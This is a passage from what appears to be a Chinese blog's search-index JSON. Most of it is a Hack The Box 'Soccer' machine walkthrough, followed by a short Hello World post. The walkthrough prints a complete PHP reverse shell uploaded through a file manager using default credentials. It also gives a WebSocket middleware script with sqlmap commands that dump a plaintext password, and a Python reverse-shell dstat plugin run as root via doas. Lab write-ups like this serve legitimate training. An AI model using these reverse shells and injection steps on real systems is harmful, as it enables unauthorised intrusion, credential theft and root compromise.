&amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://soccer.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.4 [+] Timeout: 10s =============================================================== 2023/02/06 07:27:43 Starting gobuster in directory enumeration mode =============================================================== /.htaccess (Status: 403) [Size: 162] /.htpasswd (Status: 403) [Size: 162] Progress: 13324 / 20470 (65.09%)[ERROR] 2023/02/06 07:35:14 [!] Get \"http://soccer.htb/our-blog\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 13333 / 20470 (65.13%)[ERROR] 2023/02/06 07:35:15 [!] Get \"http://soccer.htb/out\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 13408 / 20470 (65.50%)[ERROR] 2023/02/06 07:35:21 [!] Get \"http://soccer.htb/p7ap\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 14609 / 20470 (71.37%)[ERROR] 2023/02/06 07:36:13 [!] Get \"http://soccer.htb/producttags\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 14614 / 20470 (71.39%)[ERROR] 2023/02/06 07:36:14 [!] Get \"http://soccer.htb/profiles\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 14625 / 20470 (71.45%)[ERROR] 2023/02/06 07:36:17 [!] Get \"http://soccer.htb/promoted\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 14652 / 20470 (71.58%)[ERROR] 2023/02/06 07:36:21 [!] Get \"http://soccer.htb/proplayer\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) Progress: 14707 / 20470 (71.85%)[ERROR] 2023/02/06 07:36:25 [!] Get \"http://soccer.htb/prototype\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) /tiny (Status: 301) [Size: 178] [--&gt; http://soccer.htb/tiny/] Progress: 20469 / 20470 (100.00%) =============================================================== 2023/02/06 07:40:00 Finished =============================================================== 扫得http://soccer.htb/tiny/，浏览器访问，是个登录界面 下方有个超链接：—— © CCP Programmers ——，打开一看，就是登录页面的标题。 Github有默认用户名和密码 默认用户名/密码: admin/admin@123 user/12345 用admin用户登录进来，浏览页面，有个上传点，那当然是试试能不能上传个反弹shell。试来试去，发现刚进来的主界面是/var/www/html目录，正常的www服务目录，上传的话只会上传到当前所在目录，而且只有tiny/uploads目录下可以上传成功。由于靶场环境会隔几分钟刷新，所以上传的文件留存不了太久，建议上传之前就开好监听 nc -nvlp 3030 #端口改成自己脚本对应的 反弹shell脚本如下，注意修改ip为自己的vpn环境的ip（ifconfig命令看tun0网卡ip） 参考https://github.com/Cyberw1ng/Bug-Bounty/blob/main/rev_shell.php &lt;?php set_time_limit (0); $VERSION = \"1.0\"; $ip = '10.10.16.6'; // CHANGE THIS $port = 3030; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise. This is quite common and not fatal.\"); } chdir(\"/\"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } $descriptorspec = array( 0 =&gt; array(\"pipe\", \"r\"), 1 =&gt; array(\"pipe\", \"w\"), 2 =&gt; array(\"pipe\", \"w\") ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \"$string\\n\"; } } ?&gt; 上传成功 URL栏里访问Shell文件https://www.soccer.htb/tiny/uploads/ReverseShell.php 监听接收到shell响应 获取bash，也就是转换成交互式shell 此时我们先看home目录，看有哪些用户，然后发现/home/player目录下有个user.txt，但www-data用户无访问权限 然后来看ngnix的配置文件，在/etc/nginx/sites-enabled发现子域名soc-player.soccer.htb，这子域名也可以在/etc/hosts发现 再次添加域名解析条目进hosts文件，然后浏览器访问，如下可看到【Match】、【Login】、【Signup】字段 echo \"10.10.11.194 soc-player.soccer.htb\" &gt;&gt; /etc/hosts Match页面没什么东西 那我们就试试【Singnup】注册个账户，注册成功 然后登录 登录成功，跳转到一个票据检查页面 查看源码，用了WebSocket 这里搜寻了大佬的思路，参考：Automating Blind SQL injection over WebSocket，可以利用WebSocket，实施SQL注入。在任意位置新建以下脚本文件 from http.server import SimpleHTTPRequestHandler from socketserver import TCPServer from urllib.parse import unquote, urlparse from websocket import create_connection ws_server = \"ws://soc-player.soccer.htb:9091/\" def send_ws(payload): ws = create_connection(ws_server) # If the server returns a response on connect, use below line #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here # For our case, format the payload in JSON message = unquote(payload).replace('\"','\\'') # replacing \" with ' to avoid breaking JSON structure data = '{\"id\":\"%s\"}' % message ws.send(data) resp = ws.recv() ws.close() if resp: return resp else: return '' def middleware_server(host_port,content_type=\"text/plain\"): class CustomHandler(SimpleHTTPRequestHandler): def do_GET(self) -&gt; None: self.send_response(200) try: payload = urlparse(self.path).query.split('=',1)[1] except IndexError: payload = False if payload: content = send_ws(payload) else: content = 'No parameters specified!' self.send_header(\"Content-type\", content_type) self.end_headers() self.wfile.write(content.encode()) return class _TCPServer(TCPServer): allow_reuse_address = True httpd = _TCPServer(host_port, CustomHandler) httpd.serve_forever() print(\"[+] Starting MiddleWare Server\") print(\"[+] Send payloads in http://localhost:8081/?id=*\") try: middleware_server(('0.0.0.0',8081)) except KeyboardInterrupt: pass 先运行脚本，后开启sqlmap sqlmap -u \"http://localhost:8081/?id=1\" 死活测不出来，后面升级sqlmap，还不行，盯了两天，看了好几个大佬的思路，确定这个sql注入是必经之路，无奈，只能白嫖大佬的注入结果（如有大佬有思路，烦请指点一二） sqlmap -u “http://localhost:8081/?id=\" sqlmap -u “http://localhost:8081/?id=\" --current-db sqlmap -u “http://localhost:8081/?id=\" -D soccer_db --tables sqlmap -u \"http://localhost:8081/?id=\" -D soccer_db -T accounts --dump +------+-------------------+----------+----------------------+ | id | email | username | password | +------+-------------------+----------+----------------------+ | 1324 | player@player.htb | player | PlayerOftheMatch2022 | +------+-------------------+----------+----------------------+ 然后SSH连上这个player用户 接下来就是提权，我们用doas和dstat联动提权 doas：以其他用户身份执行命令，系统管理员可以对其进行设定，赋予指定使用者执行特定指令的权限。 dstat：用于生成系统资源统计信息的多功能工具。 关键点就在于用户可以给dstat添加查看系统资源的脚本文件，我们可以在脚本文件中利用socket来建立连接，从而获取shell。 我们用下列查找命令，可以发现靶机包含dstat工具 find / -type d -name dstat 2&gt;/dev/null 注：由于find在匹配查找过程中，会有部分目录无可读权限，从而会产生“Permission denied”的错误提示，此处“2&gt;/dev/null”是为了过滤掉这些提示，简化输出结果。“2&gt;/dev/null”表示重定向错误提示信息（stderr）到“/dev/null”，“/dev/null”是一个不存在的空设备。 可以看到dstat文件的格式都是dstat_*.py 官方给出的可能包含外部dstat_*.py插件的目录有如下几个 ~/.dstat/ (path of binary)/plugins/ /usr/share/dstat/ /usr/local/share/dstat/ 我们可以在/usr/local/share/dstat目录新建dstat_wa0er.py，内容如下 import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.16.15\",3030)); #此处ip及端口依然对应开启监听的主机和端口 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\"/bin/sh\") 开启端口监听 nc -nvlp 3030 借助doas，以root身份执行dstat命令，从而执行dstat_wa0er.py doas -u root /usr/bin/dstat --wa0er 可以看到，我们成功拿到root权限 参考Soccer — Hack The Box Hack The Box — Soccer Machine Simple Writeup by Karthikeyan Nagaraj Automating Blind SQL injection over WebSocket NodeJS WebSocket SQLi vulnerable WebApp doas dstat","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"Hello World","slug":"Hello-World","date":"2022-03-08T12:10:39.000Z","updated":"2022-03-08T12:26:37.055Z","comments":true,"path":"posts/4a17b156.html","link":"","permalink":"https://wa0er.github.io/posts/4a17b156.html","excerpt":"","text":"#include&lt;stdio.h&gt; int main() { printf(\"Hello World!!!\\n\"); return 0; }","categories":[{"name":"Hello World","slug":"Hello-World","permalink":"https://wa0er.github.io/categories/Hello-World/"}],"tags":[{"name":"Hello World","slug":"Hello-World","permalink":"https://wa0er.github.io/tags/Hello-World/"}],"author":"wa0er"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://wa0er.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"细读经典","slug":"漏洞复现/细读经典","permalink":"https://wa0er.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BB%86%E8%AF%BB%E7%BB%8F%E5%85%B8/"},{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"},{"name":"Hello World","slug":"Hello-World","permalink":"https://wa0er.github.io/categories/Hello-World/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"},{"name":"细读经典","slug":"细读经典","permalink":"https://wa0er.github.io/tags/%E7%BB%86%E8%AF%BB%E7%BB%8F%E5%85%B8/"},{"name":"Log4j2","slug":"Log4j2","permalink":"https://wa0er.github.io/tags/Log4j2/"},{"name":"JNDI注入","slug":"JNDI注入","permalink":"https://wa0er.github.io/tags/JNDI%E6%B3%A8%E5%85%A5/"},{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"},{"name":"Hello World","slug":"Hello-World","permalink":"https://wa0er.github.io/tags/Hello-World/"}]}